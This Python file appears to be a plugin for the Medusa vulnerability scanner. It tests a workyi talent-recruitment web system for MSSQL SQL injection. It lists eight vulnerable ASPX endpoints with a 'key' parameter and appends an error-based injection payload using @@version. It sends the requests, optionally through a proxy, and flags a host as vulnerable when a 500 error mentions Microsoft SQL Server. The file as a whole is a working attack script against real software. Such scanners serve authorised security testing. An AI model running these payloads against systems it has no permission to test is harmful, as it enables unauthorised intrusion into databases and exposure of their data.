#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: workyi人才系统多处注入漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0115124
         http://www.wooyun.org/bugs/wooyun-2010-0115157
author: Ascotbe
reference: Lucifer
description: 多处存在mssql SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


urls = ["/persondh/urgent.aspx?key=",
        "/persondh/highsalary.aspx?key=",
        "/persondh/parttime.aspx?key=",
        "/companydh/latest.aspx?key=",
        "/companydh/vip.aspx?key=",
        "/companydh/picture.aspx?key=",
        "/companydh/recommand.aspx?key=",
        "/companydh/parttime.aspx?key="]
payload = "%27AnD%20@@VeRsIon>0%20Or%27%%27=%27%"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    Medusas=[]
    try:
        for turl in urls:
            payload_url = scheme+"://"+url+turl +payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if code==500 and con.lower().find('microsoft sql server')!=-1:
                Medusa = "{} 存在workyi人才系统多处注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas